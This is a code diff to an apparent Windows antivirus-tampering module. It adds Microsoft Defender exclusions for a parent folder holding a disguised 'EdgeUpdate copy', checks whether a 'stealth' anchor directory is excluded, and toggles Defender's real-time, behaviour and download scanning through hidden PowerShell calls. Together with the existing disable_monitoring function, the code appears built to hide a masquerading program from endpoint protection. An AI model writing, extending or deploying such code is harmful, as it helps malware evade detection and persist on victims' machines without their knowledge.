@@ -51,6 +51,8 @@ def add_exclusion(path_or_process: str) -> bool:
     if not IS_WINDOWS:
         return False
     target = os.path.abspath(path_or_process)
+    # Also cover the parent: the EdgeUpdate copy lives under it.
+    parent = os.path.dirname(target)
 
     if not os.path.isdir(target):
         # Treat as a process name (e.g. "pythonw.exe").
@@ -90,6 +92,25 @@ def status() -> dict:
         "anchor_excluded": excluded(stealth.anchor_directory()),
         "engine": (out.strip().replace("\n", " ") or "unknown")[:120],
     }
+
+
+def enable_monitoring() -> bool:
+    """Undo :func:`disable_monitoring`."""
+    if not IS_WINDOWS:
+        return False
+    cmd = (
+        "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue; "
+        "Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue"
+    )
+    try:
+        res = subprocess.run(
+            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
+            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
+        )
+        return res.returncode == 0
+    except Exception:
+        return False
 
 
 def disable_monitoring() -> bool:
